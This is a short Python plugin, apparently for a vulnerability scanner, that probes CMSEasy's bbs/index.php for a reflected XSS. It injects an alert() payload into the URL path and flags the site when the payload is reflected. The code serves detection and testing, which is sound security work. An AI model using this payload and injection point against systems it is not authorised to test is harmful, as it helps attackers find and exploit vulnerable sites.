#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Medici.Yan'
#Cmseasy bbs/index.php 处反射型XSS
#http://www.2cto.com/Article/201409/334119.html
def assign(service, arg):
	if service == "cmseasy":
		return True, arg
def audit(arg):
        desurl=arg+"bbs/index.php/%27%2Balert(e10adc3949ba59abbe56e057f20f883e)%2B%27/?case=file"
        code,head,content,errcode,re_url=curl.curl(desurl)
        if code==200 and 'alert(e10adc3949ba59abbe56e057f20f883e)' in content:
              security_info(desurl)
if __name__ == '__main__':
	from dummy import *
	audit(assign('cmseasy', 'http://www.example.com/')[1])
